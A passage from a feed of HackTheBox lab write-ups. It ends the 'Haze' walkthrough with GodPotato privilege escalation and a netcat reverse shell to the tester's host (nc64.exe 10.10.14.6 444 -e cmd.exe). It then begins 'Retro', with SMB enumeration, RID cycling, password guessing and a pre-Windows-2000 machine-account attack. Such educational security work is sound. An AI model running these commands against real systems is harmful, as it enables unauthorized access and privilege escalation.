class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\GodPotato-NET4.exe</span><span class="w"> </span><span class="nt">-cmd</span><span class="w"> </span><span class="s2">"cmd /c whoami"</span><span class="w"> </span><span class="go">[*] CombaseModule: 0x140728269471744 [*] DispatchTable: 0x140728272062792 [*] UseProtseqFunction: 0x140728271354688 [*] UseProtseqFunctionParamCount: 6 [*] HookRPC [*] Start PipeServer [*] CreateNamedPipe \\.\pipe\2f3dba63-0053-4f1d-a4c1-1da79f12d463\pipe\epmapper [*] Trigger RPCSS [*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046 [*] DCOM obj IPID: 0000a002-0b58-ffff-4738-e8e098b1679b [*] DCOM obj OXID: 0x9ffda463d83c804d [*] DCOM obj OID: 0x7573302bfedf2859 [*] DCOM obj Flags: 0x281 [*] DCOM obj PublicRefs: 0x0 [*] Marshal Object bytes len: 100 [*] UnMarshal Object [*] Pipe Connected! [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE [*] CurrentsImpersonationLevel: Impersonation [*] Start Search System Token [*] PID : 932 Token:0x764 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation [*] Find System Token : True [*] UnmarshalObject: 0x80070776 [*] CurrentUser: NT AUTHORITY\SYSTEM [*] process start with pid 1648 </span></code></pre></div></div> <p>It runs as SYSTEM!</p> <h4 id="shell-2">Shell</h4> <p>I’ll upload <code class="language-plaintext highlighter-rouge">nc64.exe</code> to Haze and use it to get a shell:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nx">http://10.10.14.6/nc64.exe</span><span class="w"> </span><span class="nt">-outfile</span><span class="w"> </span><span class="nx">nc64.exe</span><span class="w"> </span><span class="gp">PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\GodPotato-NET4.exe</span><span class="w"> </span><span class="nt">-cmd</span><span class="w"> </span><span class="s2">"C:\programdata\nc64.exe 10.10.14.6 444 -e cmd.exe"</span><span class="w"> </span></code></pre></div></div> <p>This time it just hangs, but at <code class="language-plaintext highlighter-rouge">nc</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lnvp</span> 444 <span class="go">Listening on 0.0.0.0 444 Connection received on 10.10.11.61 55644 Microsoft Windows [Version 10.0.20348.3328] (c) Microsoft Corporation. All rights reserved. </span><span class="gp">C:\Windows\system32&gt;</span><span class="w"> </span></code></pre></div></div> <p>I’m able to grab the flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\Administrator\Desktop&gt;</span><span class="nb">type </span>root.txt <span class="go">e5e0e5dd************************ </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-haze"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-haze"/>
<category term="nmap"/>
<category term="windows"/>
<category term="active-directory"/>
<category term="netexec"/>
<category term="splunk"/>
<category term="splunk-enterprise"/>
<category term="cve-2024-36991"/>
<category term="directory-traversal"/>
<category term="file-read"/>
<category term="splunksecrets"/>
<category term="password-spray"/>
<category term="rusthound-ce"/>
<category term="bloodhound"/>
<category term="bloodhound-ce"/>
<category term="bloodhound-python"/>
<category term="gmsa"/>
<category term="windows-acl"/>
<category term="bloodyad"/>
<category term="gettgt"/>
<category term="shadow-credential"/>
<category term="certipy"/>
<category term="splunk-app"/>
<category term="reverse-shell-splunk"/>
<category term="seimpersonate"/>
<category term="godpotato"/>
<summary type="html">
<![CDATA[ Haze is built around an instance of Splunk Enterprise. I’ll start by exploiting a directory traversal / file read in Splunk that allows me to leak configuration files that container encrypted passwords. I’ll exfil the key and decrypt them, finding a password that’s reused by a user. That user has limited access, but I’m able to spray the password and find a second user with the same password. That user can abuse some Windows ACLs to get access to the gMSA password for a service account. I’ll use that account to get a Shadow Credential for the next user. From there I’ll access a Splunk backup archive, and find older passwords that work for the admin account on the Splunk website. I’ll upload a malicious Splunk application to get a shell as the next user. That shell has the SeImpersonatePrivilege, which I’ll abuse with GodPotato to get system access. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/haze-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/haze-cover.png"/>
</entry>
<entry>
<title type="html">HTB: Retro</title>
<link href="https://0xdf.gitlab.io/2025/06/24/htb-retro.html" rel="alternate" type="text/html" title="HTB: Retro"/>
<published>2025-06-24T09:00:00+00:00</published>
<updated>2025-06-24T09:00:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/06/24/htb-retro</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/06/24/htb-retro.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/retro-cover.webp" /> <img loading="lazy" src="/img/retro-cover.png" alt="Retro" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>Retro starts with an SMB share and note about a trainee account that uses the username as the password. From there, I’ll find a machine account that’s old and has the pre-Windows 2000 password set. That account allows me access to ESC a vulnerable ADCS template, providing administrator access.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/671 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/retro" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Retro</a> <a href="https://hackthebox.com/machines/retro" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-retro.webp" /> <img src="/icons/box-retro.png" alt="Retro" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/retro" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right">24 Jun 2025</td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">24 Jun 2025</td> </tr> <tr> <td>OS</td> <td style="text-align: right">Windows <picture><source type="image/webp" srcset="/icons/Windows.webp" /><img src="/icons/Windows.png" alt="Windows" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td>Creator</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/250152" target="_blank" rel="noopener"><img alt="r0BIT" src="https://www.hackthebox.com/badge/image/250152" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> r0BIT</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="initial-scanning">Initial Scanning</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds 22 open TCP ports:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.129.234.44 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-22 19:50 UTC Nmap scan report for 10.129.234.44 Host is up (0.092s latency). Not shown: 65513 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 5357/tcp open wsdapi 5985/tcp open wsman 9389/tcp open adws 49664/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 56349/tcp open unknown 56358/tcp open unknown 56917/tcp open unknown 56930/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 53,88,135,139,389,445,464,593,636,3268,3269,3389,5357,5985,9389 <span class="nt">-sCV</span> 10.129.234.44 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-22 19:51 UTC Nmap scan report for 10.129.234.44 Host is up (0.092s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-22 20:04:09Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl | Not valid before: 2024-10-02T10:33:09 |_Not valid after: 2025-10-02T10:33:09 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl | Not valid before: 2024-10-02T10:33:09 |_Not valid after: 2025-10-02T10:33:09 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl | Not valid before: 2024-10-02T10:33:09 |_Not valid after: 2025-10-02T10:33:09 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl | Not valid before: 2024-10-02T10:33:09 |_Not valid after: 2025-10-02T10:33:09 |_ssl-date: TLS randomness does not represent time 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: RETRO | NetBIOS_Domain_Name: RETRO | NetBIOS_Computer_Name: DC | DNS_Domain_Name: retro.vl | DNS_Computer_Name: DC.retro.vl | Product_Version: 10.0.20348 |_ System_Time: 2025-05-22T20:04:51+00:00 |_ssl-date: 2025-05-22T20:05:32+00:00; +12m17s from scanner time. | ssl-cert: Subject: commonName=DC.retro.vl | Not valid before: 2025-04-08T01:55:44 |_Not valid after: 2025-10-08T01:55:44 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Service Unavailable |_http-server-header: Microsoft-HTTPAPI/2.0 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 12m16s, deviation: 0s, median: 12m16s | smb2-time: | date: 2025-05-22T20:04:52 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 92.98 seconds </span></code></pre></div></div> <p>The box shows many of the ports associated with a <a href="/cheatsheets/os#windows-domain-controller">Windows Domain Controller</a>. The domain is <code class="language-plaintext highlighter-rouge">retro.vl</code>, and the hostname is <code class="language-plaintext highlighter-rouge">DC</code>.</p> <p>I’ll use <code class="language-plaintext highlighter-rouge">netexec</code> to generate a <code class="language-plaintext highlighter-rouge">hosts</code> file line and add it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.129.234.44 <span class="nt">--generate-hosts-file</span> hosts <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts /etc/hosts | sponge /etc/hosts </code></pre></div></div> <h3 id="smb---tcp-445">SMB - TCP 445</h3> <h4 id="enumeration">Enumeration</h4> <p><code class="language-plaintext highlighter-rouge">netexec</code> without any creds is not able to enumerate SMB shares:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc.retro.vl <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logfail">[-]</span><span class="go"> Error enumerating shares: STATUS_USER_SESSION_DELETED </span></code></pre></div></div> <p>However, the guest account works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc.retro.vl <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logsuccess">[+]</span><span class="go"> retro.vl\guest: </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">Share Permissions Remark</span><span class="err"> </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">----- ----------- ------ </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">ADMIN$ Remote Admin </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">C$ Default share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">IPC$ READ Remote IPC </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">NETLOGON Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">Notes </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">SYSVOL Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">Trainees READ </span></code></pre></div></div> <p>In addition to the standard Windows DC shares, there’s <code class="language-plaintext highlighter-rouge">Notes</code> and <code class="language-plaintext highlighter-rouge">Trainees</code>. It appears that the guest account has no access to <code class="language-plaintext highlighter-rouge">Notes</code> and only read access to <code class="language-plaintext highlighter-rouge">Trainees</code>.</p> <h4 id="trainees">Trainees</h4> <p>The <code class="language-plaintext highlighter-rouge">Trainees</code> share contains a single text file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>smbclient //dc.retro.vl/Trainees <span class="nt">-U</span> <span class="s1">'guest%'</span> <span class="go">Try "help" to get a list of possible commands. </span><span class="gp">smb: \&gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="go"> . D 0 Sun Jul 23 21:58:43 2023 .. DHS 0 Wed Apr 9 03:16:04 2025 Important.txt A 288 Sun Jul 23 22:00:13 2023 4659711 blocks of size 4096. 1280370 blocks available </span></code></pre></div></div> <p>I’ll download it:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">smb: \&gt; </span>get Important.txt <span class="go">getting file \Important.txt of size 288 as Important.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec) </span></code></pre></div></div> <p>The file is a note from the Admins to the Trainees:</p> <blockquote> <p>Dear Trainees,</p> <p>I know that some of you seemed to struggle with remembering strong and unique passwords. So we decided to bundle every one of you up into one account. Stop bothering us. Please. We have other stuff to do than resetting your password every day.</p> <p>Regards</p> <p>The Admins</p> </blockquote> <h4 id="user-enumeration">User Enumeration</h4> <p>The <code class="language-plaintext highlighter-rouge">--users</code> flag isn’t able to read anything:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc.retro.vl <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--users</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logsuccess">[+]</span><span class="go"> retro.vl\guest: </span></code></pre></div></div> <p>I am able to RIDcycle:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc.retro.vl <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--rid-brute</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logsuccess">[+]</span><span class="go"> retro.vl\guest: </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 500: RETRO\Administrator (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 501: RETRO\Guest (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 502: RETRO\krbtgt (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 512: RETRO\Domain Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 513: RETRO\Domain Users (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 514: RETRO\Domain Guests (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 515: RETRO\Domain Computers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 516: RETRO\Domain Controllers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 517: RETRO\Cert Publishers (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 518: RETRO\Schema Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 519: RETRO\Enterprise Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 520: RETRO\Group Policy Creator Owners (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 521: RETRO\Read-only Domain Controllers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 522: RETRO\Cloneable Domain Controllers (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 525: RETRO\Protected Users (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 526: RETRO\Key Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 527: RETRO\Enterprise Key Admins (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 553: RETRO\RAS and IAS Servers (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 572: RETRO\Denied RODC Password Replication Group (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 1000: RETRO\DC$ (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 1101: RETRO\DnsAdmins (SidTypeAlias) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 1102: RETRO\DnsUpdateProxy (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 1104: RETRO\trainee (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 1106: RETRO\BANKING$ (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 1107: RETRO\jburley (SidTypeUser) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 1108: RETRO\HelpDesk (SidTypeGroup) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC 1109: RETRO\tblack (SidTypeUser) </span></code></pre></div></div> <p>There’s a trainee user, which is likely what the note was referring to.</p> <p>I’ll also note the RETRO\BANKING$ account, which looks like a machine account.</p> <h2 id="auth-as-banking">Auth as BANKING$</h2> <h3 id="auth-as-trainee">Auth as Trainee</h3> <p>Given the note, it seems reasonable that the password for the trainee account be something simple and potentially guessable. I’ll take a guess that it might be the account name, and it works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc.retro.vl <span class="nt">-u</span> trainee <span class="nt">-p</span> trainee <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logsuccess">[+]</span><span class="go"> retro.vl\trainee:trainee </span></code></pre></div></div> <h3 id="authenticated-smb-enumeration">Authenticated SMB Enumeration</h3> <p>The trainee account is able to read the <code class="language-plaintext highlighter-rouge">Notes</code> share:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc.retro.vl <span class="nt">-u</span> trainee <span class="nt">-p</span> trainee <span class="nt">--shares</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logsuccess">[+]</span><span class="go"> retro.vl\trainee:trainee </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">Share Permissions Remark</span><span class="err"> </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">----- ----------- ------ </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">ADMIN$ Remote Admin </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">C$ Default share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">IPC$ READ Remote IPC </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">NETLOGON READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">Notes READ </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">SYSVOL READ Logon server share </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-shareenum">Trainees READ </span></code></pre></div></div> <p>The share contains two files:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>smbclient //dc.retro.vl/Notes <span class="nt">-U</span> <span class="s1">'trainee%trainee'</span> <span class="go">Try "help" to get a list of possible commands. </span><span class="gp">smb: \&gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="go"> . D 0 Wed Apr 9 03:12:49 2025 .. DHS 0 Wed Apr 9 03:16:04 2025 ToDo.txt A 248 Sun Jul 23 22:05:56 2023 user.txt A 32 Wed Apr 9 03:13:01 2025 4659711 blocks of size 4096. 1279897 blocks available </span></code></pre></div></div> <p>I’ll download both:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">smb: \&gt; </span>get user.txt <span class="go">getting file \user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) </span><span class="gp">smb: \&gt; </span>get ToDo.txt <span class="go">getting file \ToDo.txt of size 248 as ToDo.txt (0.7 KiloBytes/sec) (average 0.4 KiloBytes/sec) </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">user.txt</code> is the first flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>user.txt <span class="go">cbda362c************************ </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">ToDo.txt</code> is another note:</p> <blockquote> <p>Thomas,</p> <p>after convincing the finance department to get rid of their ancienct banking software it is finally time to clean up the mess they made. We should start with the pre created computer account. That one is older than me.</p> <p>Best</p> <p>James</p> </blockquote> <h3 id="pre-windows-2000">Pre-Windows-2000</h3> <h4 id="validate-password">Validate Password</h4> <p>I noted the extra computer in the domain above, and it’s named BANKING$, which matches with the note. Combining that with the hint in the note of ancient reminds of Pre-Windows 2000 computers. I exploited this in <a href="/2025/04/26/htb-vintage.html#analysis">Vintage</a>, and there’s a nice <a href="https://trustedsec.com/blog/diving-into-pre-created-computer-accounts">TrustedSec post</a> as well. These computer accounts use their hostname, all lowercase, as their password.</p> <p>Trying that here fails, but with a different error than if I have the wrong password:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc.retro.vl <span class="nt">-u</span> <span class="s1">'BANKING$'</span> <span class="nt">-p</span> banking <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logfail">[-]</span><span class="go"> retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc.retro.vl <span class="nt">-u</span> <span class="s1">'BANKING$'</span> <span class="nt">-p</span> oxdf <span class="netexec-protocol">SMB </span><span class="go"> 10.129.234.44 445 DC </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 